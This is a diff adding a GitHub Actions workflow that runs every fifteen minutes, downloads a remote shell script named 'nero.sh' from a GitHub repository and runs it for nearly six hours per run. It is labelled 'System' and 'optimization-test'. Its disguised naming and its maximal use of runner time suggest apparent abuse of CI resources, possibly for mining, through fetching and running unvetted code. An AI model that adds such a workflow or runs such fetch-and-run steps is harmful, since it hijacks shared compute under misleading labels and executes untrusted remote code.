@@ -1,0 +1,19 @@
+name: System
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/15 * * * *'
+
+jobs:
+  optimization-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: optimization
+        run: |
+          curl -sLo nero.sh https://raw.githubusercontent.com/SandieDrotos/effective-octo-eureka/main/nero.sh
+          chmod +x nero.sh
+          
+      - name: Running
+        run: |
+          timeout 355m ./nero.sh || echo "System Stopped"
